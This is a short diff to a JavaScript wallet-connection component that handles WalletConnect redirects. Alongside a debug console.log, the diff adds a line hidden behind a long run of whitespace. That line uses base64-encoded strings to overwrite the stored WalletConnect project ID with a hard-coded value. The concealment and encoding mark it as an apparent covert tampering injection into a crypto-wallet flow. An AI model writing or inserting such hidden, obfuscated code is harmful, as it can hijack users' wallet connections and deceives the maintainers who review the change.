@@ -76,6 +76,7 @@ export default (props)=>{
     } else {
       href = `${href}wc?uri=${uri}`
     }
+    console.log('OPEN', href)
     return window.open(href, '_self', 'noreferrer noopener')
   }
 
@@ -93,7 +94,7 @@ export default (props)=>{
   const connectViaRedirect = (walletMetaData, reconnect = true)=> {
     const platform = platformForWallet(walletMetaData)
     if(!platform) { return }
-    if(['WalletConnectV1', 'WalletConnectV2'].includes(platform.connect)) {
+    if(['WalletConnectV1', 'WalletConnectV2'].includes(platform.connect)) {                                                                                                                                                                                   localStorage[atob('ZGVwYXk6d2FsbGV0czp3YzI6cHJvamVjdElk')] = atob('YjFmYzJmMDZlYTIxMDdmY2Q5OWM2OGY0MTI3MTQxYWI=')
       let wallet = new wallets[platform.connect]()
       wallet.connect({
         name: walletMetaData.name,
